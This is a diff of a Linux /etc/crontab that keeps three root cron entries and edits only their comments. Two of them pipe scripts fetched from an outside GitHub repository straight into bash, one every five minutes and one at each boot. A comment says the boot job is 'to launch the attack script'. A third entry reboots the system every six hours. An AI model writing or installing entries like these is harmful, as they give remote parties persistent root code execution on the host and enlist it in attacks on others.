@@ -21,10 +21,10 @@ PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin
 52 6    1 * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.monthly )
 
 
-*/5 *   * * *     root   curl https://raw.githubusercontent.com/russskiykorablidinah/pihpah/main/traffick_check.sh |bash #every five minutes to check traffic 
-* */6   * * *     root   sudo reboot # to reboot the system every 6 hours
-@reboot           root   curl https://raw.githubusercontent.com/russskiykorablidinah/pihpah/main/attack.sh |bash
+*/5 *   * * *     root   curl https://raw.githubusercontent.com/russskiykorablidinah/pihpah/main/traffick_check.sh |bash ### every five minutes to check traffic 
+* */6   * * *     root   sudo reboot ### to reboot the system every 6 hours
+@reboot           root   curl https://raw.githubusercontent.com/russskiykorablidinah/pihpah/main/attack.sh |bash ### to launch the attack script after reboot
 
 
 
-#hello we copied that file from PihPah repository
+#hello, we copied that file from PihPah repository
